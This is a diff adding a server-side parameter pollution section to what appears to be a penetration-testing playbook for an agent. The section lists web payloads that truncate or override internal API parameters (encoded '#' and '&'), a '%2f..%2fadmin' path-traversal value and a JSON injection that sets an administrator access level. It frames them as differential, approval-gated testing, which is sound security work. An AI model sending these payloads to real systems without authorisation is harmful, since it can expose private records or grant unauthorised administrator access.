@@ -214,3 +214,51 @@ Arjun / paramspider (param discovery)    custom script: fire each dup ordering, 
 
 # Pure override via duplication = the HPP finding. A smuggled payload = the delivered bug (that agent
 # confirms it); HPP is noted as the vector. Stay benign, use test identities, get approval for real changes.
+
+## Extended arsenal — server-side parameter pollution (SSPP)   (differential/error proof · real state changes approval-gated)
+
+Distinct from the duplicate-occurrence precedence above: here YOUR input is concatenated into a
+*server-side* request the front-end makes to an INTERNAL API (e.g. `GET /users/search?name=<you>&publicProfile=true`).
+URL-encode a query/path/structure metacharacter to truncate, add, or override params on that INNER request.
+Any field can reach the sink — query, body, headers, path segments.
+
+### Query-string injection (URL-encode the metacharacter)
+| intent | send (as the value) | inner request becomes | tell |
+|---|---|---|---|
+| truncate the rest | `name=peter%23` | `...?name=peter#&publicProfile=true` | drops `publicProfile=true` → private records returned = confirmed |
+| add an ignored param | `name=peter%26foo=x` | `...?name=peter&foo=x&...` | response unchanged → injected but unused |
+| add a MEANINGFUL param | `name=peter%26email=x` | `...?name=peter&email=x&...` | behaviour/error changes → the inner param is parsed |
+| override an existing param | `name=peter%26name=carlos` | `...?name=peter&name=carlos&...` | result depends on the INNER stack (below) |
+
+Inner duplicate-parameter precedence (infer the backend from which value wins):
+```
+PHP            -> LAST wins  (carlos)
+ASP.NET        -> COMBINED   (peter,carlos)  -> often an "Invalid ..." error = a handy oracle
+Node / Express -> FIRST wins (peter)         -> response unchanged
+```
+Find inner-param candidates with hidden-parameter discovery, then test `%26<param>=<value>`.
+
+### REST path injection (input lands in a path segment)
+```
+name=peter%2f..%2fadmin     ->  /api/private/users/peter/../admin   --normalize-->   /api/private/users/admin
+```
+
+### Structured-data injection (input embedded into JSON/XML unencoded)
+```
+# direct JSON field injection
+name = peter","access_level":"administrator      -> {"name":"peter","access_level":"administrator"}
+# app decodes then re-embeds without re-encoding
+{"name":"peter\",\"access_level\":\"administrator"}
+# XML sink -> XInclude / XXE: hand to xxe-*
+```
+
+### Detect (victimless, benign)
+```
+1. inject ONE encoded metachar at a time: %23(#)  %26(&)  =  "  \      -> diff body/status/error vs baseline
+2. read the error TEXT: "Invalid name" echoing your tail = NOT truncated; split/combined values fingerprint the stack
+3. path values: try %2f..%2f and check whether the inner router normalizes
+```
+Benign ethos: confirm by DIFFERENTIAL or ERROR only. A truncation that merely widens a result set is
+confirm-only; anything that flips an authz flag / identity / price uses TEST identities and is approval-gated
+for a real state change. De-dupe: if the inner request carries the input into SQL/NoSQL/XXE, that is the
+delivered bug — hand it to that agent; SSPP is the vector.
